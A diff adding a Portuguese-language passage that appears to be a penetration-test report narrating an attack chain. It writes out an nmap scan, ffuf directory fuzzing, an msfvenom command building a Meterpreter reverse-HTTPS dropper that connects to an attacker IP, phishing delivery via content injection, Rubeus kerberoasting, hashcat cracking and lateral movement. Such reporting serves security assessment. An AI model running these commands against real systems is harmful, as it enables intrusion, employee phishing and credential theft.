@@ -1,0 +1,13 @@
+Durante os testes, foi realizada uma varredura inicial no escopo externo com a ferramenta nmap, utilizando o comando nmap -sS -sV -Pn -p- target.com, com o objetivo de mapear portas e serviços disponíveis. A partir da análise do resultado, foi identificada a exposição de um serviço RDP na porta 3389.
+
+Em paralelo, realizou-se a enumeração de serviços e diretórios com a ferramenta ffuf, com o comando ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50, o que permitiu descobrir um painel administrativo desprotegido.
+
+Após análise mais aprofundada da aplicação web acessível nesse painel, foi identificada uma funcionalidade vulnerável a Content Injection, possibilitando a injeção de conteúdo HTML e JavaScript malicioso em campos visíveis a outros usuários. A exploração permitiu a execução de um payload de phishing interno, que induziu um colaborador da empresa a executar um arquivo .exe malicioso.
+
+Esse executável, gerado via msfvenom com o comando msfvenom -p windows/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe -o dropper.exe, foi entregue por meio de engenharia social e, ao ser executado, abriu uma sessão reversa para a infraestrutura de ataque. A conexão foi tratada por um servidor C2 configurado no Metasploit.
+
+Já dentro da estação de trabalho comprometida, executando Windows 10, foram utilizadas ferramentas como Seatbelt e SharpHound para reconhecimento local e levantamento de permissões e tokens. Em seguida, foi identificado que o usuário logado possuía permissões para requisitar tickets de serviço no Active Directory.
+
+Com base nessa descoberta, foi realizado Kerberoasting através da ferramenta Rubeus, executando o comando Rubeus.exe kerberoast /output:hashes.txt. O hash de um serviço sensível foi crackeado com sucesso usando hashcat, permitindo o acesso com credenciais válidas de um usuário privilegiado.
+
+Com as novas credenciais obtidas, foi possível realizar lateral movement e autenticação remota em outro host da rede, onde foi confirmada a possibilidade de execução de comandos com privilégio de administrador local. Isso permitiu total controle da máquina, manipulação de serviços e leitura de dados sensíveis armazenados localmente.
